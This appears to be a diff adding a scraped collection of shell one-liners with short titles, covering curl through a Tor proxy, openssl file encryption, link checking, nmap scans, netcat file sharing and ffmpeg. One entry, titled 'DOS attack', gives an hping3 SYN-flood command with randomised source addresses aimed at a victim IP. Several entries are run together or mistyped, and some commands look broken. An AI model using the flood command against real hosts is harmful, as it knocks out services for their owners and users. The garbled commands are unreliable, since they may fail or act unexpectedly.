@@ -1,0 +1,50 @@
+Title: Fetch the current human population of Earth
+
+$ curl --silent http://www.census.gov/population/international/ | grep 
+wclocknum | sed -r 's@^.*>([0-9,]+)<>.*$@\1@'
+
+Title: Use curl with a local SOCKS5 proxy (e.g. Tor)
+
+$ turl(){ curl --socks5-hostname localhost:9050 $@ ; }
+
+Routes curl input through a local SOCKS5 proxy; in this case, anonymizes curl 
+activity via The Onion Router (Tor) proxy running locally.
+
+Title: AES file encryption with openssl
+$ openssl aes-256-cbc -salt -in secrets.txt -out secrets.txt.enc
+To decrypt: openssl aes-256-cbc -d -in secrets.txt.enc -out secrets.txt.new
+Optional parameter -a makes output base64 encoded, can be viewed in text editor
+or pasted in email
+Title: check your up to date delicious links.
+$ curl -k https://Username:Password@api.del.icio.us/v1/posts/all?red=api | 
+xml2| \grep '@href' | cut -d\= -f 2- | sort | uniq | linkche cker --stdin 
+--complete -v -t 50 -F blacklist
+
+This commands queries the delicious api then runs the xml through xml2, grabs 
+the urls cuts out the first two columns, passes through uniq to remove 
+duplicates if any, and then goes into linkchecker who checks the links. the 
+links go the blacklist in ~/.linkchecker/blacklist. please see the manual pages
+for further info peeps. I took me a few days to figure this one out. I how you 
+enjoy it. Also don't run these api more then once a few seconds you can get 
+banned by delicious see their site for info.
+Title: DOS attack
+$ hping3 --rand-source -p 80 -S --flood Victim_ip
+Perform a DOS attack from Linux using hping3 
+DOS=Denial-of-Service
+
+#!/bin/bash
+wget -q -O - checkip.dyndns.org | sed -e 's/[^[:digit:]\|.]//g'Title: nmap
+$ db_nmap -T4 -A -v -v ( TARGET )
+$ nmap --script dhcp-discover 192.168.244.0/24
+wery usebl
+
+$ !!; while [ $? -ne 0 ]; do !!; done
+Executes the previously-run command constantly until it returns 0 (success). 
+Title: Running applications require X in ssh
+$ ssh -X -l user 192.168.1.25
+One time you logged in, you can prove these method just writing "firefox".
+Title: Sharing a file through http 80 port:
+$ nc -w 5 -v -l -p 80 <> file.ext
+
+$ ffmpeg -r 12 -i img%03d.jpg -sameq -s hd720 -vcodec libx264 -crf 25 
+OUTPUT.MP4
